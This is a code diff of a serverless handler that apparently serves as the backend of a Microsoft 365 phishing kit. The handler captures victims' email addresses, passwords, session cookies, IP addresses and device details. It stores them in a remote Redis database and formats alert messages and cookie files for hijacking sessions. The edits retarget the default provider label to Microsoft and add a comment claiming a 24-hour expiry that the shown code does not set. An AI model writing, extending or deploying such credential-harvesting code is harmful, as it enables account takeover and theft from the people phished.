@@ -152,7 +152,7 @@ export const handler = async (event, context) => {
     const sessionData = {
       email: email || '',
       password: password || 'Not captured',
-      provider: provider || 'Others',
+      provider: provider || 'Microsoft',
       fileName: fileName || 'Microsoft 365 Access',
       timestamp: timestamp || new Date().toISOString(),
       sessionId,
@@ -177,6 +177,7 @@ export const handler = async (event, context) => {
           token: UPSTASH_REDIS_REST_TOKEN,
         });
         
+        // Store with TTL of 24 hours
         await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
         await redis.set(`user:${email}`, JSON.stringify(sessionData));
         await redis.set(`cookies:${sessionId}`, JSON.stringify({
@@ -200,7 +201,7 @@ export const handler = async (event, context) => {
 
 📧 ${email || 'Not captured'}
 🔑 ${password || 'Not captured'}
-🏢 ${provider || 'Others'}
+🏢 ${provider || 'Microsoft'}
 🕒 ${new Date().toLocaleString()}
 🌐 ${clientIP} | ${deviceInfo}
 🍪 ${formattedCookies.length} cookies captured
@@ -270,7 +271,7 @@ export const handler = async (event, context) => {
         `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;
 
       const cookiesFileContent = `// Cookie Data for ${email || 'unknown'} - ${new Date().toISOString()}
-// Provider: ${provider || 'Others'}
+// Provider: ${provider || 'Microsoft'}
 // IP: ${clientIP}
 // Microsoft 365 Session Data
 // Cookies Found: ${cookiesForFile.length}
